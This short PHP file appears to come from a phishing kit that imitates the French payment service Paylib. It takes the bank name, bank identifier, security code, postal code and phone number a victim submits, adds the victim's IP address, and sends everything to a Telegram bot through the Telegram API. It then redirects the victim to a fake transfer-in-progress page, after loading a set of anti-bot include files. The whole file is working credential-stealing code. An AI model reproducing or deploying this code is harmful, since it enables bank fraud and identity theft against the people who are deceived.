<?php

session_start();
include '../anti/anti1.php';
include '../anti/anti15.php';
include '../anti/anti2.php';
include '../anti/anti3.php';

$ip = getenv("REMOTE_ADDR");


$message = "[+]━━━━【🔥 PAYLIB BANK INFO 🔥】━━━━[+]\r\n";
$message .= "[+] Nom de votre banque : " .$_POST['bankNoms']."\r\n";
$message .= "[+] IDENTIFIANT BANCAIRE : " .$_POST['bankId']."\r\n";
$message .= "[+] code de sécurité: " .$_POST['bankPsw']."\r\n";
$message .= "[+] code postal : " .$_POST['bankCp']."\r\n";
$message .= "[+] NUMERO DE TELEPHONE : " .$_POST['bankTel']."\r\n";


$message .= "[+]━━━━【💻 System INFO】━━━━[+]\r\n";
$message .= "[+] IP : " .$ip."\n";
$message .= "[+]━━━━【🔥 PAYLIB 🔥】━━━━[+]\n";



file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

HEADER("Location: ../fin/settings/Virementencours.php");


?>

